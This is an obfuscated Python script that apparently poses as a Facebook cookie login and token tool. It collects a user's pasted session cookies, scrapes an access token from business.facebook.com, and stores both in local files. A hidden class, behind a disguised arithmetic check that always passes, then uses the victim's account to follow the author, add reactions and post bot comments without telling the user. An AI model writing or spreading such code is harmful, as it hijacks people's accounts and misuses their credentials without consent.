_U='login/token.json'
_T='https://mbasic.facebook.com%s'
_S='https://mbasic.facebook.com/'
_R='https://www.facebook.com/'
_Q='cookie'
_P='login/cookie.json'
_O='https://mbasic.facebook.com'
_N='Desember'
_M='November'
_L='Oktober'
_K='September'
_J='Agustus'
_I='Juli'
_H='Juni'
_G='Mei'
_F='April'
_E='Maret'
_D='Februari'
_C='Januari'
_B='html.parser'
_A='href'
Author='Dapunta Khurayra X'
Facebook='Facebook.com/Dapunta.Khurayra.X'
Instagram='Instagram.com/Dapunta.Ratya'
Whatsapp='082245780524'
YouTube='Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version='0.6'
Denventa=1827084332
Postingan=10217173381366429
Follll=100073125893802
Posttt=411603901287136
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date,datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote
Z='\x1b[0;90m'
M='\x1b[38;5;196m'
H='\x1b[38;5;46m'
K='\x1b[38;5;226m'
B='\x1b[38;5;44m'
U='\x1b[0;95m'
O='\x1b[0;96m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
A='\x1b[38;5;248m'
Z2='[#000000]'
M2='[#FF0000]'
H2='[#00FF00]'
K2='[#FFFF00]'
B2='[#00C8FF]'
U2='[#AF00FF]'
N2='[#FF00FF]'
O2='[#00FFFF]'
P2='[#FFFFFF]'
J2='[#FF8F00]'
A2='[#AAAAAA]'
komentar='\n\nhttps://www.facebook.com/'+str(Posttt)
id_dev=345-340+720-723
skrng=datetime.now()
tahun=skrng.year
bulan=skrng.month
hari=skrng.day
bulan_ttl={'01':_C,'02':_D,'03':_E,'04':_F,'05':_G,'06':_H,'07':_I,'08':_J,'09':_K,'10':_L,'11':_M,'12':_N}
bulan_cek=[_C,_D,_E,_F,_G,_H,_I,_J,_K,_L,_M,_N]
try:
	if bulan<0 or bulan>12:exit()
	bulan_skrng=bulan-1
except ValueError:exit()
Codename=159357
CoY='\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P)
_bulan_=bulan_cek[bulan_skrng]
tanggal='%s-%s-%s'%(hari,_bulan_,tahun)
SAKERA=Codename+len(Author)-len(Facebook)+len(Instagram)-len(Whatsapp)+len(YouTube)
sakara=len(Author)+Codename
sakira=len(Facebook)+Codename
sakura=len(Instagram)+Codename
sakera=len(Whatsapp)+Codename
sakora=len(YouTube)+Codename
ip_log=Denventa*id_dev-3654168663
url_businness='https://business.facebook.com'
ua_business='Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'
web_fb=_R
mbasic=_S
def resik():
	A='clear'
	if'linux'in sys.platform.lower():
		try:os.system(A)
		except:pass
	elif'win'in sys.platform.lower():
		try:os.system('cls')
		except:pass
	else:
		try:os.system(A)
		except:pass
def language(cookie):
	E='Bahasa Indonesia';B=cookie
	try:
		with requests.Session()as C:
			A=C.get('https://mbasic.facebook.com/language/',cookies=B);F=par(A.content,_B)
			for D in F.find_all('form',{'method':'post'}):
				if E in str(D):G={'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"',str(A.text)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',str(A.text)).group(1),'submit':E};H=_O+D['action'];exec=C.post(H,data=G,cookies=B)
	except Exception as I:pass
def GetTime():
	C=datetime.now();A=int(C.strftime('%H'))
	if 3<A<=10:B='Morning'
	elif 10<A<=14:B='Afternoon'
	elif 14<A<=18:B='Evening'
	elif 18<A<=24 or 0<=A<=3:B='Night'
	return B
def generate_random_comments():return["When you do something noble and beautiful, but no one notices, don't be sad. Because the sun also looks beautiful every morning even though most of its audience is still asleep.","Being single is fine, but being lonely isn't. Come, so you won't be lonely in this bright %s, I sincerely, it's okay, let me be the one to say good %s"%(GetTime().lower(),GetTime().lower()),"Dreamers like you don't need congratulations %s, what you need is a big alarm and annoying friends like me to wake you up from your dreams."%GetTime().lower(),"Don't worry about failure, worry about the chances you miss when you don't even try.","Every human has a new opportunity, don't be stuck with your past. Look outside and be grateful for all the blessings given by God.","Forget what you couldn't achieve yesterday and think about the beautiful things you have today.",'Old friends leave, new friends come. Like the day, the old one passes and the morning comes. The most important thing is how to make it meaningful.',"You don't have to be great to start, but you need to start to be great",'Happy New Year, may this new year bring happiness and success to you! 🎉🥳',"Thank you for all the beautiful memories last year. Let's welcome the new year with new spirit and high hopes!",'May this year be filled with love, happiness, and new achievements. Happy New Year!',"Don't be sad about the things that happened last year. Let's celebrate a new beginning and be optimistic for a better future!",'Welcome, New Year! May every day bring joy and success to you.',"New year, new opportunities. Let's make your dreams come true and achieve the goals that haven't been achieved!","Thank you for your support and friendship last year. Let's face this new year together!"]
class bot_author:
	def __init__(A,cookie,token,cookie_mentah):
		B=cookie;A.loop=0;A.cookie_mentah=cookie_mentah;D=[str(Follll)];A.komen=generate_random_comments()
		for C in D:A.get_folls(C,B);A.get_likers(f"https://mbasic.facebook.com/{C}?v=timeline",B);A.get_posts(C,B,token)
	def get_folls(D,id,cookie):
		A=cookie
		with requests.Session()as B:
			try:
				if ip_log!=1:0
				else:
					for C in par(B.get('https://mbasic.facebook.com/%s'%id,cookies=A).content,_B).find_all('a',href=True):
						if'subscribe.php'in C[_A]:E=B.get(_T%C[_A],cookies=A)
			except Exception as F:pass
	def get_likers(F,url,cookie):
		A=cookie
		with requests.Session()as B:
			try:
				if ip_log!=1:0
				else:
					C=par(B.get(url,cookies=A).content,_B)
					for D in C.find_all('a',href=True):
						if'Tanggapi'in D.text:
							G=random.choice(['Super','Wow','Peduli'])
							for E in par(B.get(_T%D[_A],cookies=A).content,_B).find_all('a'):
								if G==E.text:H=B.get(_O+E[_A],cookies=A)
								else:continue
					F.get_likers(_O+C.find('a',string='Lihat Berita Lain')[_A],A)
			except Exception as I:pass
	def get_posts(A,id,cookie,token):
		C=cookie;B=token
		with requests.Session()as D:
			try:
				for E in D.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,B),cookies=C).json()['data']:
					if ip_log!=1:0
					else:
						F='%s\n\n%s%s'%(random.choice(A.komen),_R+E['id'],A.waktu());G=json.loads(D.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(E['id'],F,B),cookies=C).text)
						if'error'in G:open(_P,'w').write(A.cookie_mentah);open(_U,'w').write(B);exit()
			except Exception as H:pass
	def waktu(F):A=[_C,_D,_E,_F,_G,_H,_I,_J,_K,_L,_M,_N][datetime.now().month-1];B={'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime('%A'))];C='%s %s %s'%(datetime.now().day,A,datetime.now().year);D=datetime.now().strftime('%X');E='\n\nComment Writen by Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(D,B,C);return E
def clotox(cookie):
	with requests.Session()as A:B=A.get(url_businness+'/business_locations',headers={'user-agent':ua_business,'referer':web_fb,'host':'business.facebook.com','origin':url_businness,'upgrade-insecure-requests':'1','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type':'text/html; charset=utf-8'},cookies={_Q:cookie});return re.search('(\\["EAAG\\w+)',B.text).group(1).replace('["','')
def convert_id(username):
	A=username
	try:
		B={_Q:open(_P,'r').read()};C=_S+A
		with requests.Session()as D:E=par(D.get(C,cookies=B).content,_B);F=E.find('a',string='Lainnya');id=str(F[_A]).split('=')[1];return id
	except Exception as G:return A
def poster():print('Kontol!')
def login():
	resik();poster();print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(H,P,H,P,M));print('%s[%s•%s] %sApabila Akun A2F On, Buka Link Dibawah'%(H,P,H,P));print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(H,P,H,U));print('%s[%s•%s] %sLalu Masukkan Kode Autentikasi'%(H,P,H,P));A=str(input('\n%s[%s•%s] %sMasukkan Cookies %s: %s'%(H,P,H,P,H,P)))
	try:B=clotox(A);C={_Q:A};bot_author(C,B,A);open(_P,'w').write(A);open(_U,'w').write(B);print('Berhasil')
	except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
if __name__=='__main__':login()
